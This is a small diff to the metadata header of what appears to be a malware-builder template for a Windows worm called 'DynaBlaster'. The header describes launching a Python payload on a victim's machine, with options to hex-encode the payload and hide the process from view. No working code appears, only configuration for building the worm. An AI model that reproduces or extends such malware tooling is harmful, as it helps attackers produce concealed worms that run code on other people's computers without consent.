@@ -1,6 +1,6 @@
 #!name##DynaBlaster
 #!types##worm
-#!info##Assembler worm. When launched, it creates a new process and python from the command line along with the code. You can change the startup to be visible in the console or the process running in the background. The victim must have python installed for the payload to work.
+#!info##Assembler worm (win32). When launched, it creates a new process and python from the command line along with the code. You can change the startup to be visible in the console or the process running in the background. The victim must have python installed for the payload to work.
 #!lang##asm
 #!banned##module##starter##shadow##junk
 #!globalVar##OS_EXEC##win##Target system executable
@@ -8,7 +8,7 @@
 #!system_FLAG##[W]
 #!processWorm##BasicAsm
 #!reqPayload##DB_script##Python payload script.
-#!payloadOpt##DB_script##ENCODE##bytes_hex
+#!payStep##encode_hex
 #!payloadOpt##DB_script##INCLUDE_IMPORTS##True##Include import library in code
 #!reqVar##DB_hide_process##'False' - Starts the process in the visible console. 'True' - Starts the process in the background without a view.##str
 
